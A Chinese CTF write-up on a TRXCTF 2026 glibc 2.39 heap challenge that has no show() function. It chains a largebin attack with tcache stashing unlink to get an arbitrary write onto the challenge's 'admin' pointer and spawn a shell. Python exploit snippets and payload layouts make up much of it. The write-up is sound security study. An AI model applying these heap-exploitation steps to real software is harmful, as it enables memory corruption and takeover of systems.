## 前言

看了一下 TRXCTF 2026 的堆题，这题看上去很简单，只需要一个任意地址写将`*admin`修改成目标的地址即可触发后门函数，从而 getshell，但是程序没有`show()`功能，因此无法通过修改 fd 之类的方式污染 bins，故而我们需要别的方法劫持堆。在刚开始做的时候没想出来怎么打，后面看了一眼官方的 wp，自己整理了一下。

## 文件

题目给了一个 ELF 文件，一个程序源码和 docker file，查看 docker file 可以得知采用的是`glibc 2.39-0ubuntu8.5`版本的 glibc。

查询程序保护如下：


## 攻击思路

首先没有`show()`我们无法直接修改 fd 指针，那么我们有什么方法可以在不泄露堆地址的情况下将 fake chunk 放入 tcache 呢？这时候`tcache_stashing_unlink`就派上了用场，该攻击手法能将 smallbin chunk 放入 tcache 中，同时因为 smallbin chunk 的`bk`指针没有 safe linking 保护，因此我们可以直接将其修改成`目标地址 - 0x10`然后打`tcache_stashing_unlink`即可将目标地址放入 tcache 中。

由于 malloc 源码中存在如下的代码：

```
                while (tcache->counts[tc_idx] < mp_.tcache_count

                    && (tc_victim = last(bin)) != bin)

                {

                    // 将bin中chunk脱离，然后放入cache中

                    if (tc_victim != 0)

                    {

                        bck = tc_victim->bk;

                        set_inuse_bit_at_offset(tc_victim, nb);

                        if (av != &main_arena)

                            set_non_main_arena(tc_victim);

                        bin->bk = bck;

                        bck->fd = bin;



                        tcache_put(tc_victim, tc_idx);

                    }

                }
```

他会检测你取出的 chunk 的`bk`是否为有效指针，因此如果直接打`tcache_stashing_unlink`则会因此而无法走到`tcache_put(tc_victim, tc_idx);`这一步，因此我们需要提前利用`largebin attack`将一个有效的堆地址写入`fake chunk->bk`处，从而实现对应的攻击。

## 攻击顺序

### 提前构造好 bins

因为要打`tcache_stashing_unlink`，我们需要在一开始就直接构建好 smallbin chunk，防止后面再构造时出现问题，同时提前构造 smallbin 也可以不让堆结构变得特别乱。

```
for i in range(7):
    malloc(i, 0x90)          # tcache
for i in range(6):
    malloc(10 + i, 0x90)     # 构建smallbin
    malloc(20 + 1, 0x20)     # 防止free时被合并

for i in range(7):
    free(i)
for i in range(6):
    free(10 + i)

malloc(30, 0x490)
```

此时 bin 的结构如图：

![](https://bbs.kanxue.com/upload/attach/202605/1048393_C68SDS2TSY2Y3KR.webp)

可以看到成功将 6 个 `0xa0` 的 chunk 放入 smallbin 中。

### largebin attack

此时我们需要调用 largebin attack，在`*(admin + 8)`处的地址写入一个堆地址，从而防止后续`tcache_stashing_unlink`时出现错误。

```
admin = 0x1337000

malloc(40, 0x420)             # p1
malloc(41, 0x400)
malloc(42, 0x410)             # p2
malloc(43, 0x400)

free(40)
malloc(44, 0x430)             # p3

free(42)

payload = flat({
    0x08: admin - 0x10 + 0x100,
    0x18: admin - 0x20 + 0x8
}, filler = b"\x00", length = 0x420)

edit(40, payload)

malloc(45, 0x430)
malloc(46, 0x430)              # 在官方wp中加入了这句，但是在我本地的测试情况下，这句加不加都不影响最终getshell，对于官方为什么加这句我有点不李姐，希望有大佬能够指点一二
```

最终能够发现成功将一个堆地址写入了`admin + 0x08`处的地址：

![](https://bbs.kanxue.com/upload/attach/202605/1048393_V5ZHVE3RQGREA7R.webp)

### tcache stashing unlink

接下来打`tcache_stashing_unlink`将 smallbin 中的 chunk 放入 tcache 中：

```
for i in range(7): malloc(i, 0x90)

payload = flat({
    0x08: admin - 0x10
}, filler = b"\x00", length = 0x90)

edit(15, payload)

malloc(50, 0x90)
malloc(51, 0x90)
malloc(52, 0x90)
```

在执行完`malloc(50, 0x90)`后在这里下断点调试，查看 tcache，如下图：

![](https://bbs.kanxue.com/upload/attach/202605/1048393_AZ9Q7KNSK3S37M3.webp)

可以看到 admin 的地址被成功写入了 tcache 中，接下来就只需要将其取出，然后利用 edit 对其进行修改即可。

### getshell

```
payload = flat({
    0x00: 0xdeadbeefdeadcafe
}, filler = b"\x00", length = 0x90)

edit(52, payload)
menu(5)
```
